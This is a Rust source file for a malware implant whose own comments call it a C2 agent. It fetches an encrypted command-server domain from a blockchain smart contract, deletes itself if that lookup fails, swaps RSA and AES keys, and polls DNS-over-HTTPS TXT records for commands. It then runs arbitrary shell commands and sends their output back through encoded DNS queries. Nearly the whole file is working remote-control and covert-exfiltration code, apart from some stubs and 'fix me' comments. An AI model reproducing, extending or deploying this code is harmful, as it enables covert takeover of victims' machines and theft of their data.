use std::net::{TcpStream,Shutdown};
use std::io::prelude::*;
use std::io::Result;
use ethers::prelude::*;
use ethers::providers::{Http, Middleware, Provider};
use std::str::FromStr;
use web3::contract::{Contract, Options};
use http::{Request, Response};
use url::{Url, ParseError};
use base64::{Engine as _, alphabet, engine::{self, general_purpose}};
use hex_literal::hex;
use generic_array::typenum::*;
use std::process;
use aes::Aes128;
use aes::cipher::{
    BlockCipher, BlockEncrypt, BlockDecrypt,
    generic_array::GenericArray,
};

use block_modes::Cfb;
use block_modes::block_padding::Pkcs7;
use std::str;
use std::error::Error;
use std::env;
use base32::{Alphabet, decode, encode};
use rsa::{RsaPublicKey, PublicKey, RsaPrivateKey, Pkcs1v15Encrypt, pkcs8::DecodePublicKey, Oaep, pkcs8::EncodePublicKey, pkcs8::LineEnding};
use sha2::{Sha256, Sha512, Digest};
use block_modes::block_padding::ZeroPadding;
use block_modes::{BlockMode, block_padding::Padding};
type Aes128ECfb = Cfb<Aes128, Pkcs7>;
use core::arch::x86_64;
static Hash: &str = "be7534055f1279b3df5f6d8397abe25e7d41d4cf9e24c1045d9bded4ebd971ca";
static ContractKey: &str = "F+NEpSVY6P/KpzqAsMT/Fw==";
static TestnetRPC: &str = "https://endpoints.omniatech.io/v1/matic/mumbai/public";
use std::hint;
use aes::NewBlockCipher;
use fancy_regex::Regex; 

fn parseCertificate(response: &str) -> String{
    let re = Regex::new(r"(?<==)(.*?)\\").unwrap();
    let mut result = String::new();

    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        result.push_str(&data);
    }
    return result.clone()

}

static mut SleepTime: Option<Mutex<u64>> = None;

fn sendDnsRequest(domain: &str) -> Result<()>{
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "A");

    let client = reqwest::blocking::Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();
    Ok(())
}

fn dnsRequestEncoder(domain: &str, message: &String){
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - (dnsdomainNameSize + 10);
    let mut packetOrder = 0;
    let base32Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &message.as_bytes()
    );
    println!("Complete: {}", &base32Data);
    let messageSize = base32Data.len();
    let mut messageRemainSize = (messageSize / maxDNSData);
    let mut lastPacket = 0;


    let mut result = String::new();



    //dns_max = 200
    // dns_domain_name_size = len("domain") + 2
    // max_dns_data = dns_max - dns_domain_name_size
    // packet_order = 0
    // remaining_packets = (messageSize + max_dns_data - 1) / max_dns_data
    let dns_domain_max = 256;
    let label_max = 50;
    let max_labels = (dns_domain_max)  / (label_max + 1); // +1 por causa do ponto entre os rótulos
    let max_dns_data = max_labels * label_max;
    let mut packet_order = 0;

    let remaining_packets = (messageSize + max_dns_data - 1) / max_dns_data;

    let mut iterator = 0;

    for (i, c) in base32Data.chars().enumerate() {
        result.push(c);
        if (result.len() == (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-{}-k", packetOrder, result.len(), remaining_packets);
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
            sendDnsRequest(&result);
            println!("DNS :: {}", &result);
            result.clear();
            iterator = 0;
        }
        if iterator % 50 == 0 && iterator != 0{
            result.push('.');
        }
        iterator += 1;
    }
    if lastPacket == 1 || result.len() < 255{
        packetOrder += 1;
        let s = format!("-{}-{}-{}-_", packetOrder, result.len(), remaining_packets);
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        sendDnsRequest(&result);
        println!("DNS :: {}", &result);
        result.clear();
        lastPacket = 0;
    }


}
use std::sync::Mutex;
use lazy_static::lazy_static;



fn generateKeyPair() -> (String, RsaPrivateKey){
    let mut rng = rand::thread_rng();
    let bits = 1024;
    let private_key_local = RsaPrivateKey::new(&mut rng, bits).unwrap();
    let public_key = RsaPublicKey::from(&private_key_local);
    let pubkey_der = public_key.to_public_key_der().unwrap();
    let pubkey_der_string = pubkey_der.to_pem("PUBLIC KEY", LineEnding::default()).unwrap();
    (pubkey_der_string, private_key_local)

}

// generate RSA keypair and send public key to C2 over DoH
fn handleKeyGeneration(domain: &str, serverPublicKey: &str) -> (String, RsaPrivateKey){
    let (pubkey, privkey) = generateKeyPair();
    let pubkeyBase32 = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &pubkey.as_bytes()
    );

    println!("Key :: {}", pubkeyBase32);

    let mut hasher = Sha256::new();
    hasher.update(serverPublicKey);
    let result = hasher.finalize();

    let serverPublicKeySha256: String = format!("{:x}", result);
    let s = format!("1|{}|{}", serverPublicKeySha256, pubkeyBase32);
    println!("Request :: {}", &s);
    dnsRequestEncoder(domain, &s);
    (serverPublicKeySha256, privkey)
}
use std::{thread, time};
 
fn parseDNSTextEntry(response: &str) -> String{
    //println!("Parsing {}", &response);
    let re = Regex::new(r"(?<=dv=)(.*?)\\").unwrap();
    let mut result = String::new();
    
    let mut captures_iter = re.captures_iter(response);
    for x in captures_iter{
        let mut data = x.unwrap().get(0).unwrap().as_str();
        data = data.trim_end_matches("\\");
        result.push_str(&data);
    }

    if result.is_empty(){
        let re = Regex::new(r"(?<=xv=)(.*?)\\").unwrap();
        let mut result = String::new();
        
        let mut captures_iter = re.captures_iter(response);
        for x in captures_iter{
            let mut data = x.unwrap().get(0).unwrap().as_str();
            data = data.trim_end_matches("\\");
            result.push_str(&data);
        }
        return result.clone()

    }
    return result.clone()
}

fn is_base32(s: &str) -> bool {
    let decode = base32::decode(Alphabet::RFC4648 { padding: true }, s);
    if decode.is_some(){
        return true
    }
    if decode.is_none(){
        return false
    }
    return false
}

fn checkDNSTextEntry<'a>(domain: &str, private_key_internal: &RsaPrivateKey, public_key_hash: &str) -> Vec<String>{
    let mFormat: String = format!("2|{}", public_key_hash);
    let base32Data = base32::encode(
        Alphabet::RFC4648 { padding: true },
        &mFormat.as_bytes()
    );
    let dnsMAX = 255;
    let dnsdomainNameSize = domain.len();
    let maxDNSData = dnsMAX - dnsdomainNameSize;
    let mut packetOrder = 0;
    let messageSize = base32Data.len();
    let mut messageRemainSize = messageSize;
    let mut lastPacket = 0;
    let mut result = String::new();

    for (i, c) in base32Data.chars().enumerate() {
        if i % 61 == 0 && i != 0{
            result.push('.');
        }
        if (result.len() >= (maxDNSData - dnsdomainNameSize)){
            packetOrder += 1;
            let s = format!("-{}-{}-kkdc", packetOrder, result.len());
            result.push_str(&s);
            result.push('.');
            result.push_str(domain);
            lastPacket = 1;
        }
        result.push(c);
    }
    if lastPacket == 1 || result.len() < 255{
        packetOrder += 1;
        let s = format!("-{}-{}-_", packetOrder, result.len());
        result.push_str(&s);
        result.push('.');
        result.push_str(domain);
        lastPacket = 0;
    }


    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", &result)
        .append_pair("type", "TXT");
    let client = reqwest::blocking::Client::new();
    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    result.clear();

    let mut ndata = parseDNSTextEntry(&data);

    let bFlag = is_base32(&ndata);
    if bFlag == false{
        // println!("Data :: {}",&ndata);
        let commandDecoded = &base64::decode(ndata).unwrap();
        let padding = Oaep::new::<sha2::Sha256>();
        let dec_data = private_key_internal.decrypt(padding, &commandDecoded);
        match dec_data{
            Ok(dec_data) =>{
                let utf_data = String::from_utf8(dec_data).unwrap();
                let new_string: String = utf_data.to_owned();
                let parts: Vec<String> = new_string.split('|').map(|s| s.to_string()).collect();
                return parts;
            }
            Err(err)=>{
                println!("Error! {}", err);
                return vec![]
            }
        }
    }
    ndata.clear();
    return vec![];
}

fn migrateProcessToPID(procPID: &str) -> &str{
    return procPID;
}

fn listRunningProcesses(){
    println!("Listing running processes...");
}

use std::process::{Command, Stdio};

use execute::{Execute, command};


// fix me! maximum message size for RSA OAEP is 190 bytes!
// split the message and sent!



// fix this shit! dont work + shit + stupid + shit
// fix this shit rn!

type Aes128CfbEnc = cfb_mode::Encryptor<aes::Aes128>;
type Aes128CfbDec = cfb_mode::Decryptor<aes::Aes128>;

fn dnsRequestEncryptEncode<'a>(data: &str, enc_key: &Vec<u8>, iv: &[u8]) -> Vec<u8> {

    let mut encData:&[u8] = &mut data.as_bytes();
    let pos = data.len();

    println!("Using IV {:?} for encription {} | key {:?}\n", &iv, &iv.len(), &enc_key);

    let cipher = Cfb::<Aes128, Pkcs7>::new_from_slices(&enc_key, &iv).unwrap();
    // let mut ciphertext = encData.to_vec();
    let mut buffer = vec![0u8; encData.len() + 16];
    buffer[..encData.len()].copy_from_slice(encData);
    
    let ciphertext = cipher.encrypt(&mut buffer, pos).unwrap();
    // cipher.encrypt(&mut ciphertext, pos).unwrap();
    let mut result = Vec::new();
    result.extend(&iv.to_vec());
    result.extend(&ciphertext.to_vec());
    println!("Encrypted! {:?}",&result);
    result
}

fn commandExec(public_key_hash: &str, domain: &str, aes_key: &str, private_key_internal: &RsaPrivateKey){
    let key = base32::decode(Alphabet::RFC4648 { padding: true }, aes_key).unwrap();
    println!("Key :: {:?}", &key);

    let s: String = format!("2c|{}", public_key_hash);
    dnsRequestEncoder(domain, &s);

    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", &domain)
        .append_pair("type", "TXT");
    let client = reqwest::blocking::Client::new();
    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();
    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    let commandVec = parseDNSTextEntry(&data);

    // println!("Read from TXT :: {:?}", &commandVec);
    let commandDec = base32::decode(Alphabet::RFC4648 { padding: true }, &commandVec).unwrap();
    let str2Dec = std::str::from_utf8(&commandDec).unwrap();
    println!("test {}", &str2Dec);

    let commandDec = base64::decode(&str2Dec);

    let commandDec: Vec<u8> = match commandDec {
        Ok(decoded) => {
            decoded
        }
        Err(err) => {
            println!("Erro na decodificação: {:?}", err);
            Vec::new()
        }
    };
    
    if !commandDec.is_empty(){
        let iv = &commandDec[..16];
        let ciphertext = &commandDec[16..];
    
        println!("IV : {:?} | Ciphertext: {:?} | Key :: {:?}", &iv, &ciphertext, &key);
        
        let mut buf = ciphertext.to_vec();
    
        let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();
        let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();
    
        let commandStrFinalParts = str::from_utf8(&decrypted_ciphertext[16..]).unwrap();
        let commandParts: Vec<&str> = commandStrFinalParts.split('|').collect();
    
        let commandToExec = commandParts.get(2).unwrap();
    
        println!("Command:: {}", &commandToExec);
    
    
        //println!("Executing command! {}", commandStr);
        let mut execCmd = command(commandToExec);
        execCmd.stdout(Stdio::piped());
        execCmd.stderr(Stdio::piped());
        let output = execCmd.execute_output().unwrap();
    
        let s: String = format!("2c|{}", public_key_hash);
        let data = format!("{}|{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
    
        let encData = dnsRequestEncryptEncode(&data, &key, &iv);
        let encodedData = base64::encode(&encData);
    
        let fData = format!("{}|{}", s, encodedData);
    
        println!("Sending... {}", &fData);
        dnsRequestEncoder(domain, &fData);
    }
}


use std::thread::park_timeout;
use std::time::{Instant};
use std::arch::asm;
fn commandServerHandler(domain: &str, public_key_external: &RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
    unsafe{
        if let Some(ref mutex) = SleepTime{
            while true{
		hint::spin_loop();
                let mut stime = mutex.lock().unwrap();
                let timeout = Duration::from_secs(*stime);

                let command = checkDNSTextEntry(&domain, &private_key_internal, &public_key_hash);
                core::arch::x86_64::_mm_mfence();
		if !command.is_empty(){
                    match command.get(1).unwrap().as_str() {
                        "a" => println!("o segundo elemento é um!"),
                        "s" => {
                                let s: String = format!("s|{}", public_key_hash);
				core::arch::x86_64::_mm_mfence();
                                dnsRequestEncoder(domain, &s);
                               // println!("Data :: {}", command.get(2).unwrap().as_str());
                                *stime = command.get(2).unwrap().parse().unwrap();
                                std::mem::drop(stime);
                            }
                        "x" => println!("o segundo elemento é três!"),
                        "m" => {
                            migrateProcessToPID(command.get(2).unwrap().as_str());
                        },
                        "l" => {
                            listRunningProcesses();
                        },
                        "c" => {
                            println!("Data - all :: {:?}", &command);
                            // commandExec(public_key_hash: &str, domain: &str, aes_key: &str, private_key_internal: &RsaPrivateKey)
                            commandExec(&public_key_hash, &domain, command.get(2).unwrap().as_str(), &private_key_internal);
                        }
                        _ => println!("o segundo elemento não é válido!"),
                    }
                }

		//let seconds = timeout.as_secs() as i64;
		//let nanoseconds = timeout.subsec_nanos() as i64;
		//let ts = libc::timespec{
		//	tv_sec: seconds,
	//		tv_nsec: nanoseconds,
	//	};
	//	unsafe{
	///		let mut result: u64;
	//		asm!(
	//			"syscall",
	//			in("rax") libc::SYS_nanosleep,
	//			in("rdi") &ts as *const _,
	//			in("rsi") std::ptr::null::<libc::timespec>(),
	//			lateout("rax") result,
	//			lateout("rcx") _,
	//			lateout("r11") _,
	//			options(nostack),
	//		    );
	//	}
                // spinlock sleep
                let start = Instant::now();
		core::arch::x86_64::_mm_mfence();
		hint::spin_loop();
                while start.elapsed() < timeout {
		    unsafe{
                        core::arch::x86_64::_mm_lfence();
		    	hint::spin_loop();
                    //unsafe {
                        //asm!(
                         //   "nop",
                        //);
                    }
                }
                
            }
        }
    }
}


use std::time::Duration;
#[allow(unused_variables)]
fn serverHandler(domain: &str, public_key_external: RsaPublicKey, public_key_hash: &str, private_key_internal: &RsaPrivateKey){
    unsafe {
        SleepTime = Some(Mutex::new(10)); // Default sleep time
    }
    let domain_clone = domain.to_string();
    let public_key_hash_clone = public_key_hash.to_string();
    let public_key_external_clone = public_key_external.clone();
    let private_key_clone = private_key_internal.clone();

    thread::spawn(move || {
        commandServerHandler(&domain_clone, &public_key_external_clone, &public_key_hash_clone, &private_key_clone);
    });

    // Dummy infinite sleep
    loop {
        let timeout = Duration::from_secs(1);
        let start = Instant::now();
        while start.elapsed() < timeout {}
    }
}


fn handleCertificate(domain: &str) -> Result<()>{
    let mut url = Url::parse("https://1.1.1.1/dns-query").unwrap();
    url.query_pairs_mut()
        .append_pair("name", domain)
        .append_pair("type", "TXT");

    let client = reqwest::blocking::Client::new();

    let mut request = client.get(url.as_str()).header("accept", "application/dns-json").send();

    let mut response = request.unwrap();
    let mut data = response.text().unwrap();

    let mut result = String::new();
    result = parseCertificate(&data);
    let decoded_bytes = decode(
        Alphabet::RFC4648 { padding: true },
        &result
    ).unwrap();
    let public_key_external = Some(RsaPublicKey::from_public_key_pem(&String::from_utf8_lossy(&decoded_bytes)).unwrap());

    println!("{:?}", public_key_external);

    let (serverPublicKeySha256, privkey) = handleKeyGeneration(domain, std::str::from_utf8(&decoded_bytes).unwrap());

    println!("{:?}", serverPublicKeySha256);

    serverHandler(domain, public_key_external.unwrap(), &serverPublicKeySha256, &privkey);

    let s = format!("2|{}", serverPublicKeySha256);
    dnsRequestEncoder(domain, &s);

    Ok(())
}

use serde_json::Value;
use rustc_serialize::json::{Json, ToJson};

async fn handleContractKeccak(contractAddress: &str) -> String{
    // call RPC and interact with smart contract variable name (keccak)

    let timeout = Duration::from_secs(0);
    let start = Instant::now();
    //while start.elapsed() < timeout {
     //   unsafe {
//	    hint::spin_loop();
            //asm!(
             //   "nop",
            //);
  //      }
    //}

    let mut payload = String::from(r#"{"method": "eth_call","params": [{"from": "0x0000000000000000000000000000000000000000","to": "CONTRACTADDRESS","data": "0xf51325ed"},"latest"],"id": 1,"jsonrpc": "2.0"}"#);
    let newPayload = payload.replace("CONTRACTADDRESS", contractAddress);


    let mut object: Value = serde_json::from_str(&newPayload).unwrap();

    let client = reqwest::Client::new();
    let mut request = client.post(TestnetRPC)
    .json(&object)
    .send()
    .await;

    let response = request.unwrap().text().await.unwrap();

    let json_object = Json::from_str(&response).unwrap();

    match json_object.find("result") {
        Some(field) => {
            let name = field.as_string().unwrap();
            let testing = hex::decode(&name[2..]).unwrap();
            let testStr = str::from_utf8(&testing).unwrap().replace(",","");
            let testStr = &testStr.trim_matches('\x00')[32..];
        
            return testStr.to_string()
        },
        None => {
            "".to_string()
        }
    }
}

use std::fs;
use std::mem;
use std::ptr;
// use libc::{mprotect, PROT_NONE, PROT_READ};

#[tokio::main]
async fn rpcInteract(addr: &str) -> Result<((()), String)>{
    let contractC2 = handleContractKeccak(addr).await;
    if contractC2 == ""{
        let path = std::env::current_exe().unwrap();
        fs::remove_file(&path).unwrap();

        //let base_addr = std::ptr::null_mut();

        //let program_size = 0; // Preencher com o tamanho do programa
    
        // Definir as permissões desejadas
        //let prot = PROT_NONE;
    
        // Remover a permissão de leitura
        //let result = unsafe { mprotect(base_addr, program_size, prot) };

        process::exit(0);
    }
    let C2AESContent_b64dec = base64::decode(contractC2).unwrap();
    let key_dec = base64::decode(ContractKey).unwrap();

    let key = &key_dec[..];

    let iv = &C2AESContent_b64dec[..16];
    let message  = &C2AESContent_b64dec[16..];
    
    let mut buf = message.to_vec();

    let cipher = Aes128ECfb::new_from_slices(&key, &iv).unwrap();
    let decrypted_ciphertext = cipher.decrypt(&mut buf).unwrap();

    let domain = String::from_utf8_lossy(decrypted_ciphertext);
    Ok(((()), domain.to_string()))
}


fn main() -> std::io::Result<()> {

    let mut stream = TcpStream::connect("127.0.0.1:1338")?;
    let mut smartContractAddressBuffer= [0; 42];

    stream.write(&Hash.as_bytes())?;
    stream.read(&mut smartContractAddressBuffer)?;
    stream.shutdown(Shutdown::Both);

    let smartContractAddress = std::str::from_utf8(&smartContractAddressBuffer).unwrap().trim_matches(char::from(0));
    let rpcResponse = rpcInteract(smartContractAddress);


    match rpcResponse{
        Ok((_, domain)) =>{
            handleCertificate(&domain);
        }
        Err(e) =>{
            process::exit(0);
        }
    }

    Ok(())
}
